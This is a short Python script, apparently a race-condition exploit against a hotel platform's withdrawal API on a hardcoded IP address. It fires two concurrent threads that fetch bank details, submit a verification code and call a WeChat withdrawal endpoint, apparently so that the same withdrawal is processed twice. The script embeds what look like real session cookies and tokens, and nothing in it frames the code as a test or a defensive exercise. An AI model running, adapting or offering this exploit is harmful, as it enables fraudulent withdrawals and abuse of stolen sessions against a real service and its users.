import requests
import threading

cookies = {'z_room_view_style': '1',
           'mz_think_language': 'zh_cn',
           'manage_think_var': 'zh_cn',
           'MANTIS_PROJECT_COOKIE': '2%3B14',
           'MANTIS_VIEW_ALL_COOKIE': '10',
           'mz_UCLBRTUID': '01afd0fe-67fb-4338-9c70-6ec5bc4f6184',
           'mz_UCLBRTUSSID': 'lu89KwDGGKO5eQjQF7MbJMKmooQ18Hy%2BBSjqPz%2FTqM470u%2Ftk2EaYr7ivK9P0%2FuSBr6%2BaHSYYvDOr7ohmAPW%2B4Opyt9FAEY2vGwFHhESYgn6samTS22OsII%2FTgJjh%2Ba7lo1uT98PThavDOSQBaANlI5Tb9g50TDbQ44Xo5aKaW6yBWrMAS2Mn5t9T%2B1iQzY1f%2BJDhzBjEAhWL8sfqYMX58nvFy0fmW0PUd7%2Fq9lTuVw%2BsfrCmAEITjN6O2ZpxDB34qhaB8gvE6n1nvuHMjXfVZmKRyGIIlIOr6E7%2FLdgGP5vrzdI7bK0ofOlxWQdmK%2BXPy6osmXsWrtsXThXWsrw8A%3D%3D',
           'mz_UCLBRTUSSPS': '64996299a679ebfb0f75605ec5dba56dbe1dce48951a603394727891e30062328e4ae6355742b487d0f00ea4492bc9be614dc2efdcabd8a137eb71d1b718ad87',
           'mz_UCLBRTPSTM': '1529921051',
           'qrm_think_language': 'zh_cn',
           'PHPSESSID': '64jctsovmcht4utv8oss2lor90',

           }

data = {
    'hotel': '277'
}
data2 = {
    'vcode':'162901'
}
data3 = {
    'hotel':'277',
    'price':'0.01'
}
getAccountBank_url = "http://115.29.142.212:8010/Home/Withdraw/getAccountBank"
verifyWithMobile_url = 'http://115.29.142.212:8010/Home/Account/verifyWithMobile'
wechatWithdraw_url = 'http://115.29.142.212:8010/Home/Withdraw/wechatWithdraw'

def getbank():
    resp = requests.post(getAccountBank_url, cookies=cookies, data=data)
    print(resp.content.decode('utf-8'))

def sendcode():
    resp = requests.post(verifyWithMobile_url, cookies=cookies, data=data2)
    print(resp.content.decode('utf-8'))

def tixian():
    getbank()
    sendcode()
    resp = requests.post(wechatWithdraw_url, cookies=cookies, data=data3)
    print(resp.content.decode('utf-8'))

t1 = threading.Thread(target=tixian)
t2 = threading.Thread(target=tixian)


if __name__ == '__main__':
    t1.setDaemon(True)
    t2.setDaemon(True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
